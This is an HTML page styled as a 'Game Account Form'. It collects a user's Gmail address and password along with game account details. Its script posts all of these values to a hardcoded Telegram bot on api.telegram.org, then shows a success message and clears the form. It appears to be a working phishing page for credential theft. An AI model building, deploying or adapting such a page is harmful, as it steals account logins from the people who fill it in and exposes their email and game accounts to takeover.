<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Game Account Form</title>

<style>
body{
  background:#f0f8ff;
  font-family:Arial;
}
.container{
  max-width:400px;
  margin:40px auto;
  background:#fff;
  padding:20px;
  border-radius:10px;
}
input,select,button{
  width:100%;
  padding:10px;
  margin-top:8px;
  border-radius:5px;
  border:1px solid #ccc;
}
.row{
  display:flex;
  gap:10px;
}
.row div{flex:1;}
button{
  background:#89CFF0;
  border:none;
  font-size:16px;
}
</style>
</head>

<body>

<div class="container">
<h2>Game Account Form</h2>

<form onsubmit="sendTelegram(); return false;">
  <input id="gmail" type="email" placeholder="Gmail" required>
  <input id="password" type="password" placeholder="Password" required>
  <input id="name" type="text" placeholder="In Game Name" required>

  <div class="row">
    <div>
      <input id="gameid" type="number" placeholder="Game ID" required>
    </div>
    <div>
      <input id="serverid" type="number" placeholder="Server ID" required>
    </div>
  </div>

  <select id="device" required>
    <option value="">Select Device</option>
    <option>Android</option>
    <option>iPhone(IOS)</option>
    <option>PC</option>
  </select>

  <button type="submit">Submit</button>
</form>
<div id="successMsg" style="
  display:none;
  margin-top:15px;
  padding:10px;
  background:#d4edda;
  color:#155724;
  text-align:center;
  border-radius:5px;
">
  Success ! Your Form send to Server
</div>
</div>

<script>
function sendTelegram(){

  const token = "7980832778:AAFA_y232XO4Z8rAx9N85RQhiIpEFUI0y9I";
  const chatId = "7826877402";

  const message =
`📩 Game Account Data
📧 Gmail: ${gmail.value}
🔑 Password: ${password.value}
🎮 In game name: ${name.value}
🆔 ID: ${gameid.value}
🌐 Server ID: ${serverid.value}
📱 Device: ${device.value}`;

  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  fetch(url,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      chat_id: chatId,
      text: message
    })
  })
  .then(() => {

    // ✅ Show success message in page
    document.getElementById("successMsg").style.display = "block";

    // 🔥 Auto clear form
    document.querySelector("form").reset();

    // (optional) 3 sec နောက် message ပျောက်
    setTimeout(()=>{
      document.getElementById("successMsg").style.display = "none";
    },3000);

  })
  .catch(() => {
    alert("Error ❌");
  });
}
</script>

</body>
</html>
